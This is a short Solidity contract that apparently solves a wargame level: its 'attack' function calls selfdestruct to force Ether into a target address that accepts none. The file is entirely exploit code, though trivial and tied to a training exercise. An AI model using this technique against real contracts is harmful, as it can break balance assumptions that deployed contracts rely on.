// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceDestruct {
    address force;

    constructor(address _force) {
        force = _force;
    }

    function attack() public payable {
        selfdestruct(payable(force));
    }
}
